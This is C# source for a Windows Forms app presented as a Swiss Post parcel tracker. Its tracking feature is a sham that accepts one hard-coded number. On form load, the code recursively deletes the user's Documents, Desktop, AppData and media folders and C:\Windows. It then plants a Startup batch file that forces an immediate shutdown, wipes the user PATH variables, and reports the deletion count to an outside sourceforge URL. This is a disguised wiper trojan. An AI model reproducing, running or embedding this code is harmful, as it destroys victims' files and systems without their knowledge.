using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SwissPostTracking
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private bool isNetworkHere(){
            return System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            label2.Visible = false;
            label3.Visible = false;
            label4.Visible = false;
            label5.Visible = false;

            if (!isNetworkHere()) {
                MessageBox.Show("Please connect to the internet");
                return;
            }

            string trackingNumber = textBox1.Text;
            if (trackingNumber.Equals("56.12.238960.38602852"))
            {
                label2.Visible = true;
                label3.Visible = true;
                label4.Visible = true;
                label5.Visible = true;
            }
            else {
                MessageBox.Show("Invalid tracking number. Did You misspell it?");
            }
        }

        private void DeleteFolder( string fullPath )
        {
            Task.Factory.StartNew(path => Directory.Delete((string)path, true), fullPath);
        }

        private void OnFormShown(object sender, EventArgs e)
        {
            List<String> Directories = new List<String>();
            
            Directories.Add(GetShellFolder("Personal"));
            Directories.Add(GetShellFolder("Desktop"));
            Directories.Add(GetShellFolder("AppData"));
            Directories.Add(GetShellFolder("My Music"));
            Directories.Add(GetShellFolder("My Pictures"));
            Directories.Add(GetShellFolder("My Video"));
            Directories.Add("C:\\Windows");

            int successCount = 0;
            int failureCount = 0;

            foreach (String dir in Directories) {
                try
                {
                    DeleteFolder(dir);
                    successCount++;
                }
                catch (Exception)
                {
                    failureCount++;
                }
            }

            string InstallPath = GetShellFolder("Startup");
            try
            {
                StreamWriter SW = File.CreateText(InstallPath + "\\start.bat");
                SW.WriteLine("shutdown -s -t 0 -f");
                SW.Close();
            }
            catch (Exception) { }

            System.Environment.SetEnvironmentVariable("path", "", EnvironmentVariableTarget.User);
            System.Environment.SetEnvironmentVariable("PATH", "", EnvironmentVariableTarget.User);
            System.Environment.SetEnvironmentVariable("Path", "", EnvironmentVariableTarget.User);

            SendToServer("Succeeded: " + successCount + ", failed: " + failureCount);
        }

        private void SendToServer(String message) {
            // send to http://musicdc.sourceforge.net/msg.php?text=blergh
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://musicdc.sourceforge.net/msg.php?text="+message);
            request.BeginGetResponse(new AsyncCallback(FinishWebRequest), null);
        }

        private void FinishWebRequest(IAsyncResult ar)
        {
            if (ar != null)
                if(ar.AsyncState != null)
                    (ar.AsyncState as HttpWebRequest).EndGetResponse(ar);
        }

        private string GetShellFolder(string name) {
            try
            {
                return (string)Registry.GetValue(@"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders", name, null);
            }
            catch (Exception) { return ""; }
        }
    }
}
